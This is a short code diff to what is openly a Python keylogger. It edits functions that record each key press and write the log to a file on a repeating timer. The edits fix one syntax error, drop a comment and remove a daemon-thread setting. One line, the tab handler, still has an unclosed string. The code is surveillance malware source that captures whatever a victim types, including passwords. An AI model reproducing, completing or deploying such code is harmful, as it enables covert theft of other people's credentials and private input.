@@ -23,7 +23,7 @@ def on_press(key):
 		elif key == key.tab: LOG += '\t
 		elif key == key.cmd: LOG += ' cmd+'
 		else:
-			LOG += str(key
+			LOG += str(key)
 
 def log_to_file():
 	if SYSTEM == 'Linux':
@@ -31,9 +31,8 @@ def log_to_file():
 		f.write(LOG)
 	else:
 		f = open(WIN_DIR + 'log.txt', 'w')
-		f.write(LOG) # Write keystrokes to file.
+		f.write(LOG)
 	cycle = Timer(SECONDS_TO_LOG, log_to_file)
-	cycle.daemon = True
 	cycle.start()
 
 def keylogger():
